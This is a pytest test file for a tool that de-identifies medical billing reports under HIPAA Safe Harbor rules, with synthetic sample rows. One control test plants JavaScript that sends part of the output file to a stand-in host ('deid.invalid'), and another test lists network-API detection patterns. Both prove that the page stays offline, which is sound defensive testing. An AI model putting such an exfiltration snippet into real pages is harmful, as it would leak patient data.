"""The de-identifier's promises.

1. The Safe Harbor rules hold on the sample: no patient name, phone, member ID or encounter number survives, every
   date is a year, ages over 89 read 90+, days to pay match the original dates, and the key maps codes back.
2. The page makes no network request during a full run (choose a report, change a column, save all three files)
   or for a few seconds after, and a control run proves the recorder would catch one.
3. The page and the script write byte-identical files from the same input (CSV, Excel and an edge-case file).
"""
import base64, csv, io, os, re, subprocess, sys
from datetime import date, timedelta
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
PAGE = ROOT / 'deidentify.html'
SAMPLE = ROOT / 'sample-data' / 'deid'
SAMPLE_CSV = SAMPLE / 'sample-cpt-payment-report.csv'
SAMPLE_XLSX = SAMPLE / 'sample-cpt-payment-report.xlsx'
SETTLE_MS = 3000
sys.path.insert(0, str(ROOT))
import deidentify as di  # noqa: E402


def outputs(path, seed=11, **kw):
    return di.run(path.name, path.read_bytes(), kw.get('overrides'), seed)


def table(text):
    return list(csv.reader(io.StringIO(text, newline='')))


# ---------- 1. the rules ----------
def test_headers_from_a_real_payment_export_are_read_right():
    """The column names of a NextGen CPT payment report export."""
    got = {h: di.classify(h)[0] for h in ['Enc#', 'Payer Name', 'DOS', 'CPT', 'Billed Amt', 'Aprv Amt', 'Alwd Amt', 'Tran Dt',
                                          'Pay Amt', 'Source', 'Sv It Desc', 'Unit Price', 'Fin Class', 'Enc Referring']}
    assert got == {'Enc#': 'code', 'Payer Name': 'keep', 'DOS': 'year', 'CPT': 'keep', 'Billed Amt': 'keep', 'Aprv Amt': 'keep',
                   'Alwd Amt': 'keep', 'Tran Dt': 'year', 'Pay Amt': 'keep', 'Source': 'keep', 'Sv It Desc': 'keep',
                   'Unit Price': 'keep', 'Fin Class': 'keep', 'Enc Referring': 'keep'}


@pytest.mark.parametrize('header,action', [
    ('Patient Name', 'drop'), ('Patient', 'drop'), ('Guarantor', 'drop'), ('DOB', 'drop'), ('Pt Phone', 'drop'),
    ('Address 1', 'drop'), ('Zip', 'drop'), ('SSN', 'drop'), ('Email', 'drop'), ('Notes', 'drop'), ('Service Month', 'drop'),
    ('Mystery Field', 'drop'), ('Member ID', 'code'), ('Insurance ID', 'code'), ('Claim #', 'code'), ('Acct No', 'code'),
    ('MRN', 'code'), ('Check Number', 'code'), ('Prior Auth', 'code'), ('Patient Balance', 'keep'), ('Claim Status', 'keep'),
    ('Account Balance', 'keep'), ('Check Amount', 'keep'), ('Rendering Provider', 'keep'), ('Provider NPI', 'keep'),
    ('Paid Date', 'year'), ('Service From', 'year'), ('Age', 'age'), ('Modifier', 'keep'), ('CARC', 'keep'),
    ('PatientDOB', 'drop'), ('DateOfBirth', 'drop'), ('Birthday', 'drop'), ('Transfer From', 'drop'), ('Subscriber Name', 'drop'),
    ('Facility Name', 'keep'), ('Posted', 'year')])
def test_header_rules(header, action):
    assert di.classify(header)[0] == action


def test_sample_meets_safe_harbor():
    f = outputs(SAMPLE_CSV)
    out = table(f['sample-cpt-payment-report-deidentified.csv'])
    head, rows = out[0], out[1:]
    text = f['sample-cpt-payment-report-deidentified.csv']
    original = SAMPLE_CSV.read_text()
    assert len(rows) == 63
    for gone in ('Patient Name', 'Notes', 'Pt Phone'):
        assert gone not in head
    assert 'SAMPLE PATIENT' not in text and 'SMP' not in text and '(805)' not in text and '805-555' not in text
    encs = set(re.findall(r'\b441[0-9]{4}\b', original))
    assert encs and not any(e in text for e in encs), 'an encounter number survived'
    assert not re.search(r'[0-9]{1,2}/[0-9]{1,2}/[0-9]{2,4}', text), 'a full date survived'
    assert {r[head.index('DOS')] for r in rows} <= {'2025', '2026'}
    assert 'Tran Dt' not in head, 'a payment year beside days-to-pay could narrow down the service date'
    ages = {r[head.index('Age')] for r in rows}
    assert '90+' in ages and '92' not in ages
    assert {r[head.index('Remark')] for r in rows} >= {'Resubmitted [date], called [phone]', 'Paid as billed'}
    assert all(re.fullmatch(r'V[0-9]{4}', r[0]) for r in rows) and all(re.fullmatch(r'K[0-9]{4}', r[head.index('Member ID')]) for r in rows)
    assert rows == sorted(rows, key=lambda r: r[0]), 'rows are grouped by the random code, not in their original order'


def test_days_to_pay_and_the_key_match_the_original():
    f = outputs(SAMPLE_CSV)
    out = table(f['sample-cpt-payment-report-deidentified.csv'])
    head, rows = out[0], out[1:]
    key = {r[2]: r[1] for r in table(f['sample-cpt-payment-report-visit-code-key.csv'])[1:] if r[0] == 'Enc#'}
    orig = table(SAMPLE_CSV.read_text())
    oh = orig[3]
    by_enc = {r[0]: r for r in orig[4:]}
    d = lambda s: date(int(s[6:]), int(s[:2]), int(s[3:5]))
    assert head[-1] == 'Days from DOS to Tran Dt'
    for r in rows:
        o = by_enc[key[r[0]]]
        assert int(r[-1]) == (d(o[oh.index('Tran Dt')]) - d(o[oh.index('DOS')])).days
        assert r[head.index('DOS')] == o[oh.index('DOS')][6:]


def nextgen_file():
    """The exact header of a NextGen CPT payment report, header in row 1, Excel-style text dates, a blank row,
    a grand-total row and a printed-by footer, as a report straight out of the system might have."""
    lines = ['Enc#,Payer Name,DOS,CPT,Billed Amt,Aprv Amt,Alwd Amt,Tran Dt,Pay Amt,Source,Sv It Desc,Unit Price,Fin Class,Enc Referring']
    for n in range(40):
        dos = date(2025, 12, 20) + timedelta(days=n * 3)
        pay = dos + timedelta(days=5 + n % 20)
        lines.append('%d,SAMPLE PLAN %s,%s,99214,225.00,130.10,130.10,%s,130.10,ERA,"OFFICE O/P EST MOD 30 MIN",225.00,%s,SAMPLE PROVIDER %s'
                     % (5500000 + n * 11, 'AB'[n % 2], dos.strftime('%m/%d/%Y'), pay.strftime('%m/%d/%Y'),
                        'Commercial' if n % 2 else 'Medicare', 'ONE MD' if n % 3 else 'TWO PA'))
    lines += ['', ',Grand Total,,,9000.00,5204.00,5204.00,,5204.00,,,,,', 'Printed 11/21/2026 by SAMPLE USER,,,,,,,,,,,,,']
    return 'CPT Payment Report 11-21-2025 to 11-20-2026.csv', ('\r\n'.join(lines) + '\r\n').encode()


def test_nextgen_report_as_is():
    name, data = nextgen_file()
    f = di.run(name, data, seed=7)
    stem = 'CPT Payment Report 11-21-2025 to 11-20-2026'
    out = table(f[stem + '-deidentified.csv'])
    head, rows = out[0], out[1:]
    assert head == ['Enc#', 'Payer Name', 'DOS', 'CPT', 'Billed Amt', 'Aprv Amt', 'Alwd Amt', 'Pay Amt', 'Source',
                    'Sv It Desc', 'Unit Price', 'Fin Class', 'Enc Referring', 'Days from DOS to Tran Dt']
    text = f[stem + '-deidentified.csv']
    assert not re.search(r'55[0-9]{5}', text) and not re.search(r'[0-9]{1,2}/[0-9]{1,2}/[0-9]{2,4}', text)
    assert 'SAMPLE USER' not in text
    assert {r[2] for r in rows if r[2]} <= {'2025', '2026'}
    assert len([r for r in rows if r[-1]]) == 40 and {int(r[-1]) for r in rows if r[-1]} == set(range(5, 25))
    assert any(r[1] == 'Grand Total' for r in rows)
    record = f[stem + '-deid-record.txt']
    assert '- Tran Dt: dropped (a second date.' in record
    key = table(f[stem + '-visit-code-key.csv'])
    assert len(key) == 1 + 41 and key[0] == ['column', 'original value', 'visit code']


def test_excel_and_csv_give_the_same_copy():
    a, b = outputs(SAMPLE_CSV), outputs(SAMPLE_XLSX)
    assert a['sample-cpt-payment-report-deidentified.csv'] == b['sample-cpt-payment-report-deidentified.csv']
    assert 'first sheet "CPT Payment Report"' in b['sample-cpt-payment-report-deid-record.txt']


def test_record_and_overrides():
    rec = outputs(SAMPLE_CSV)['sample-cpt-payment-report-deid-record.txt']
    assert '3 rows above it left out' in rec and '- Notes: dropped (free text, which can hold names).' in rec
    assert '1. Names: dropped: Patient Name.' in rec and '4-5. Phone and fax numbers: dropped: Pt Phone.' in rec
    f = outputs(SAMPLE_CSV, overrides={'Notes': 'keep', 'Remark': 'drop'})
    head = table(f['sample-cpt-payment-report-deidentified.csv'])[0]
    assert 'Notes' in head and 'Remark' not in head
    assert '- Notes: kept. Set by hand.' in f['sample-cpt-payment-report-deid-record.txt']
    assert '[date]' in f['sample-cpt-payment-report-deidentified.csv'], 'kept notes still lose their dates'


def edge_file():
    """Made-up rows that exercise what the sample doesn't: no title rows, quoted fields with commas, quotes and line
    breaks, two-digit and ISO dates, an unreadable date, a free-text column with no telling header, a long number and
    an email inside kept text, a duplicate header, a blank header, and a blank row. Sample data."""
    lines = ['Account,Svc Date,Posted,Payer,Item Detail,Code,Code,,Amount',
             '"A-1",1/2/25,2025-02-01,"SAMPLE PLAN, X","Sample text, called ""desk"" re 4417733\nnext line",99213,25,x,10.00',
             '', 'A-2,13/45/2025,,SAMPLE PLAN Y,sample.person@example.com wrote back,99214,,y,"1,200.50"']
    lines += ['A-%d,03/0%d/2026,2026-04-0%d,SAMPLE PLAN Y,Sample free text line number %d with enough words in it,99213,,,5' % (n, n % 9 + 1, n % 9 + 1, n) for n in range(3, 26)]
    return ('edge.csv', ('﻿' + '\r\n'.join(lines) + '\r\n').encode('utf-8'))


def test_edge_cases():
    name, data = edge_file()
    f = di.run(name, data, None, 5)
    out = table(f['edge-deidentified.csv'])
    head, rows = out[0], out[1:]
    assert head == ['Account', 'Svc Date', 'Payer', 'Code', 'Code (2)', 'Amount', 'Days from Svc Date to Posted']
    rec = f['edge-deid-record.txt']
    assert '- Item Detail: dropped (free text, which can hold names).' in rec and '- Column 8: dropped (not recognized).' in rec
    assert '(1 not readable as a date, left blank)' in rec
    first = [r for r in rows if r[1] == '2025'][0]
    assert first[2] == 'SAMPLE PLAN, X' and first[-1] == '30'
    assert '3. Dates: cut to the year in Svc Date. Dropped beside the days column: Posted.' in rec
    f2 = di.run(name, data, {'Item Detail': 'keep'}, 5)
    t = f2['edge-deidentified.csv']
    assert '4417733' not in t and 'example.com' not in t and '[number]' in t and '[email]' in t


def review_file():
    """Made-up rows from the code review's cases: a title and blank row above a header with number buckets, all-digit
    identifiers and dates inside kept text, other date forms in text, and a date column whose header says nothing. Sample data."""
    lines = ['Sample Aging Report', '', 'Enc#,Payer,Current,30,60,90,Remark,Weird,Amount']
    remarks = ['123456789', '20260304', 'Resubmitted Mar 4, 2026', 'appeal 2026/03/04', 'seen 4-Mar-2026', 'called on 3/4',
               'Decreased 5 units', 'Paid as billed']
    for n in range(24):
        lines.append('%d,SAMPLE PLAN %s,10.00,0,0,0,"%s",03/0%d/1931,1234567' % (441000 + n, 'AB'[n % 2], remarks[n % 8], n % 9 + 1))
    return 'review.csv', ('\n'.join(lines) + '\n').encode()


def test_review_cases():
    name, data = review_file()
    f = di.run(name, data, None, 3)
    out = table(f['review-deidentified.csv'])
    head, rows = out[0], out[1:]
    assert head == ['Enc#', 'Payer', 'Remark', 'Amount'], 'the bucket columns aren\'t recognized, so they drop by default'
    text = f['review-deidentified.csv']
    assert not re.search(r'4410[0-9]{2}', text) and '123456789' not in text and '20260304' not in text and '1931' not in text
    remarks = {r[2] for r in rows}
    assert remarks == {'[number]', '[date]', 'Resubmitted [date]', 'appeal [date]', 'seen [date]', 'called on [date]',
                       'Decreased 5 units', 'Paid as billed'}
    assert {r[3] for r in rows} == {'1234567'}, 'whole numbers in an amount column pass through'
    assert 'could be birth dates' in f['review-deid-record.txt']


def test_no_header_row_stops():
    with pytest.raises(ValueError, match='column headers'):
        di.run('x.csv', b'1,2,3\n4,5,6\n', None, 1)


def test_excel_dates_inside_kept_columns_and_bad_serials():
    assert di.scrub(('46085', date(2026, 3, 4)), {}) == '[date]'
    assert di.serial_ok('46085') and not di.serial_ok('99999999') and not di.serial_ok('1_000') and not di.serial_ok('nan')


def test_codes_hold_for_one_seed_whatever_else_changes():
    a = di.run(SAMPLE_CSV.name, SAMPLE_CSV.read_bytes(), None, 9)
    b = di.run(SAMPLE_CSV.name, SAMPLE_CSV.read_bytes(), {'Remark': 'drop', 'Notes': 'keep'}, 9)
    assert a['sample-cpt-payment-report-visit-code-key.csv'] == b['sample-cpt-payment-report-visit-code-key.csv']


# ---------- 2 and 3. the page ----------
sync_api = pytest.importorskip('playwright.sync_api')


@pytest.fixture(scope='module')
def browser():
    with sync_api.sync_playwright() as p:
        try:
            b = p.chromium.launch()
        except Exception:                      # no bundled Chromium here: use one installed on this machine
            exe = os.environ.get('PW_CHROMIUM', '/opt/pw-browsers/chromium')
            b = p.chromium.launch(executable_path=exe) if Path(exe).exists() else p.chromium.launch(channel='chrome')
        yield b
        b.close()


def open_page(browser, url):
    ctx = browser.new_context(accept_downloads=True, service_workers='block')
    log = []
    ctx.on('request', lambda r: log.append(r.url))
    ctx.route(re.compile(r'^(https?|wss?|ftp)://'), lambda route: route.abort())
    ctx.on('page', lambda p: log.append('new window or tab: ' + p.url))
    page = ctx.new_page()
    log.clear()
    page.goto(url)
    return ctx, page, log


def outside(log, url):
    return [u for u in log if u != url and not u.startswith(('blob:', 'data:'))]


def use_page(page, folder, report=SAMPLE_XLSX):
    page.set_input_files('#report-file', str(report))
    page.wait_for_selector('#columns-wrap:not([hidden])', timeout=30000)
    page.select_option('select[data-col="Remark"]', 'drop')
    page.locator('#record-text', has_text='- Remark: dropped. Set by hand.').wait_for(state='attached', timeout=30000)
    saved = {}
    for kind in ('deidentified', 'record', 'key'):
        with page.expect_download() as d:
            page.click(f'[data-out="{kind}"]')
        d.value.save_as(folder / d.value.suggested_filename)
        saved[d.value.suggested_filename] = (folder / d.value.suggested_filename).read_text()
    page.wait_for_timeout(SETTLE_MS)
    return saved


def test_page_makes_no_network_requests(browser, tmp_path):
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    saved = use_page(page, tmp_path)
    windows = len(ctx.pages)
    ctx.close()
    bad = outside(log, url)
    print(f'\nRequests during a full run and {SETTLE_MS / 1000:g} s after the last save: {len(log)} (the page itself: '
          f'{log.count(url)}). Files saved: {len(saved)}. Network requests: {len(bad)}. Windows or tabs: {windows}')
    assert windows == 1 and bad == [], bad
    copy = table(saved['sample-cpt-payment-report-deidentified.csv'])
    assert 'Remark' not in copy[0] and 'Patient Name' not in copy[0] and len(copy) == 64
    assert '- Remark: dropped. Set by hand.' in saved['sample-cpt-payment-report-deid-record.txt']


def test_recorder_catches_a_late_request(browser, tmp_path):
    """Control: a copy of the page that sends data away half a second after a save. The policy doesn't govern
    navigating the tab, so the test has to catch it, and does."""
    html = PAGE.read_text().replace(
        'setTimeout(function () { URL.revokeObjectURL(url); }, 1000);',
        "setTimeout(function () { URL.revokeObjectURL(url); }, 1000); setTimeout(function () { location.href = ['ht', 'tps:', "
        "'//deid.invalid/?d='].join('') + encodeURIComponent(outputs[name].slice(0, 200)); }, 500);", 1)
    assert 'deid.invalid' in html
    copy = tmp_path / 'late.html'
    copy.write_text(html)
    ctx, page, log = open_page(browser, copy.as_uri())
    try:
        use_page(page, tmp_path)
    except Exception as e:                     # the planted navigation can tear the page down mid-save
        print('page torn down mid-run:', repr(e)[:300])
        page.wait_for_timeout(1000)
    ctx.close()
    assert any('deid.invalid' in u for u in outside(log, copy.as_uri())), log


def test_policy_blocks_connections(browser):
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    outcome = page.evaluate("fetch('https://deid.invalid/x').then(() => 'sent', e => 'refused: ' + e.name)")
    ctx.close()
    assert outcome.startswith('refused') and outside(log, url) == []


def test_source_has_no_network_code():
    src = PAGE.read_text()
    for pat in (r'https?://', r'\bfetch\s*\(', r'XMLHttpRequest', r'WebSocket', r'EventSource', r'sendBeacon', r'importScripts',
                r'<script[^>]+src=', r'<link\b', r'@import', r'(?<![\w.])url\(', r'<iframe', r'<form\b', r'navigator\.serviceWorker',
                r'<a\b', r'window\.open', r'location\.'):
        assert not re.search(pat, src, re.I), pat
    assert "connect-src 'none'" in src and "default-src 'none'" in src


@pytest.mark.parametrize('case', ['csv', 'xlsx', 'edge', 'edge-override', 'review', 'nextgen'])
def test_page_matches_script(browser, case):
    if case == 'csv':
        name, data, ov = SAMPLE_CSV.name, SAMPLE_CSV.read_bytes(), {}
    elif case == 'xlsx':
        name, data, ov = SAMPLE_XLSX.name, SAMPLE_XLSX.read_bytes(), {}
    elif case == 'review':
        (name, data), ov = review_file(), {'Weird': 'year'}
    elif case == 'nextgen':
        (name, data), ov = nextgen_file(), {'Tran Dt': 'year'}
    else:
        (name, data), ov = edge_file(), ({'Item Detail': 'keep', 'Payer': 'code'} if case == 'edge-override' else {})
    py = di.run(name, data, ov, 42)
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    js = page.evaluate("""async ([name, b64, ov]) => {
        const u8 = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
        return (await window.deidentify.run(name, u8, ov, 42)).files; }""", [name, base64.b64encode(data).decode(), ov])
    ctx.close()
    assert list(js) == list(py)
    for k in py:
        assert js[k] == py[k], f'{case}: {k} differs between the page and the script'


def test_page_reports_a_damaged_excel_file(browser, tmp_path):
    bad = tmp_path / 'cut-off.xlsx'
    bad.write_bytes(SAMPLE_XLSX.read_bytes()[:400])
    ctx, page, log = open_page(browser, PAGE.as_uri())
    page.set_input_files('#report-file', str(bad))
    page.locator('#summary.err').wait_for(timeout=10000)
    msg = page.text_content('#summary')
    ctx.close()
    assert msg.startswith('Stopped:') and 'Excel' in msg


def test_page_codes_hold_across_a_column_change(browser, tmp_path):
    """Save the copy, change a column, save the key: the key still matches the copy saved first."""
    ctx, page, log = open_page(browser, PAGE.as_uri())
    page.set_input_files('#report-file', str(SAMPLE_CSV))
    page.wait_for_selector('#columns-wrap:not([hidden])')
    with page.expect_download() as d:
        page.click('[data-out="deidentified"]')
    copy = table(Path(d.value.path()).read_text())
    page.select_option('select[data-col="Notes"]', 'keep')
    page.locator('#summary', has_text='save all three files again').wait_for(timeout=10000)
    with page.expect_download() as d:
        page.click('[data-out="key"]')
    key = {r[2]: r[1] for r in table(Path(d.value.path()).read_text())[1:] if r[0] == 'Enc#'}
    ctx.close()
    orig = table(SAMPLE_CSV.read_text())
    dos = {r[0]: r[3][6:] for r in orig[4:]}
    assert all(dos[key[r[0]]] == r[2] for r in copy[1:])


def test_cli_writes_three_files(tmp_path):
    r = subprocess.run([sys.executable, str(ROOT / 'deidentify.py'), str(SAMPLE_XLSX), '--out', str(tmp_path), '--keep', 'Notes'],
                       check=True, capture_output=True, text=True)
    assert sorted(p.name for p in tmp_path.iterdir()) == ['sample-cpt-payment-report-deid-record.txt',
                                                          'sample-cpt-payment-report-deidentified.csv',
                                                          'sample-cpt-payment-report-visit-code-key.csv']
    assert 'Share only the -deidentified.csv' in r.stdout
